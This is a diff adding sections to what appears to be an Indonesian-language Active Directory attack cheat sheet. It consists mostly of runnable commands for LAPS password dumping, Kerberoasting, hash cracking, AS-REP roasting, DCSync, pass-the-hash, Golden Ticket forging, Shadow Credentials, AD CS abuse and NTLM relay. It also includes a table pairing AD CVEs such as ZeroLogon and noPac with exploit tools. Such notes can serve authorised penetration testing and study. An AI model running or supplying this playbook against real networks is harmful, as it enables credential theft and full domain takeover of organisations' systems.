@@ -103,3 +103,86 @@ Evasion: Kerberoasting = legit TGS request → no alert (if not monitored)
 - Certipy — https://github.com/ly4k/Certipy
 - HackTricks AD — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
 - SpecterOps (AD Attacks) — https://posts.specterops.io/
+
+## 7. Konkret — SharpLAPS (LAPS Password Extraction)
+
+LAPS (Local Administrator Password Solution) — AD menyimpan password admin lokal tiap host di attribute `ms-Mcs-AdmPwd`. SharpLAPS adalah tool C# untuk dump password tersebut.
+
+```bash
+# Compile SharpLAPS
+csc SharpLAPS.cs /reference:System.Management.Automation.dll /out:SharpLAPS.exe
+
+# Eksekusi di target (requires AD query rights)
+SharpLAPS.exe /get /domain:contoso.local
+
+# Output: hostname, password admin lokal, expiration
+# Jika user biasa punya read right ke ms-Mcs-AdmPwd → dapat password plain-text
+```
+
+### Attack Chain AD Lengkap (Testable)
+
+```bash
+# 1. Recon: BloodHound ingest
+bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c All
+# Sharphound:
+SharpHound.exe -c All --zipfilename bloodhound.zip
+
+# 2. Kerberoasting (service account TGS)
+python3 GetUserSPNs.py domain.local/user:pass -dc-ip dc01 -request
+# atau Rubeus:
+Rubeus.exe kerberoast /outfile:hash.txt
+
+# 3. Cracking hash
+hashcat -m 13100 hash.txt wordlist.txt
+# atau john:
+john --format=krb5tgs hash.txt wordlist.txt
+
+# 4. AS-REP Roasting (pre-auth disabled)
+python3 GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip dc01 -format hashcat
+
+# 5. DCSync (jika punya DCReplication right)
+python3 secretsdump.py -just-dc domain.local/admin:pass@dc01
+
+# 6. Pass-the-Hash
+python3 psexec.py -hashes :NTHASH domain.local/admin@target
+
+# 7. Golden Ticket (krbtgt hash)
+python3 ticketer.py -domain domain.local -nthash <krbtgt_hash> -domain-sid <SID> Administrator
+export KRB5CCNAME=Administrator.ccache
+python3 psexec.py -dc-ip dc01 -k domain.local/Administrator@target
+
+# 8. Shadow Credentials (msDS-KeyCredentialLink)
+python3 certipy shadow auto -u user -p pass -account target -dc-ip dc01
+
+# 9. AD CS (Active Directory Certificate Services) abuse
+python3 certipy find -u user -p pass -dc-ip dc01 -vulnerable
+python3 certipy auth -pfx admin.pfx -dc-ip dc01
+```
+
+### CVE Konkret AD
+
+| CVE | Target | Teknik | Tool |
+|-----|--------|--------|------|
+| CVE-2020-1472 | Windows Server (ZeroLogon) | Netlogon cryptographic flaw → DC auth bypass | mimikatz, zer0dump |
+| CVE-2021-42278 | Windows AD (sAMAccountName) | Computer account impersonation → DC takeover | noPac |
+| CVE-2021-42321 | Exchange | Post-auth RCE via PowerShell deserialization | ssrf + ysoserial |
+| CVE-2022-26923 | AD CS | `msPKIEnrollmentAgent` escalation → cert template abuse | certipy |
+
+## 8. NTLM Relay (Testable)
+
+```bash
+# Responder (LLMNR/NBT-NS poison)
+responder -I eth0 -rdw
+
+# ntlmrelayx (relay hash ke target lain)
+ntlmrelayx.py -t smb://target -smb2support
+ntlmrelayx.py -t http://exchange -smb2support --escalate-user user
+ntlmrelayx.py -t ldap://dc01 --escalate-user user --delegate-access
+
+# Drop-the-MIC (CVE-2019-1040)
+ntlmrelayx.py -t ldap://dc01 --remove-mic --escalate-user user
+```
+---
+
+audited
+---
